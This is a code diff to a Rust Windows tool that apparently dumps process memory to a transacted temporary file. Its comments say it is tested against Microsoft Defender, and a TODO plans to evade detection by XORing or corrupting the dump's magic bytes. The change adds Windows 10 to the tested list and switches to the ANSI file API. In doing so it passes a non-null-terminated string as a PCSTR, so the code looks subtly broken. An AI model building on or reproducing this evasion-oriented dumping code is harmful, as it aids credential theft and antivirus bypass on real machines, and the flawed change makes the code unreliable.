@@ -48,7 +48,8 @@
 //! ```
 //!
 //! # Tested on
-//! * Microsoft Windows 11 with Microsoft Defender Antivirus
+//! * Microsoft Windows 10 (x64) with Microsoft Defender Antivirus
+//! * Microsoft Windows 11 (x64) with Microsoft Defender Antivirus
 //!
 //! # TODO
 //! * Optimize memory usage (simply corrupt "magic bytes" instead of XORing?)
@@ -75,7 +76,7 @@ use rand::prelude::*;
 
 use sysinfo::System;
 
-use windows::core::PCWSTR;
+use windows::core::{PCWSTR, PCSTR};
 use windows::Win32::Foundation::CloseHandle;
 use windows::Win32::Storage::FileSystem::*;
 use windows::Win32::System::Diagnostics::Debug::*;
@@ -127,11 +128,11 @@ fn dump() -> Result<(), Box<dyn Error>> {
     };
 
     // Create intermediate output file as a transacted operation
-    let filename = format!(".\\{rand}.log", rand = rand_str(16));
-    let file_ptr = filename.as_ptr() as *mut u16;
+    let filename = format!(".\\{rand}.log", rand = rand_str(8));
+    let file_ptr = filename.as_ptr() as *mut u8;
     let file_handle = unsafe {
-        CreateFileTransactedW(
-            PCWSTR(file_ptr),
+        CreateFileTransactedA(
+            PCSTR(file_ptr),
             FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
             FILE_SHARE_WRITE,
             None,
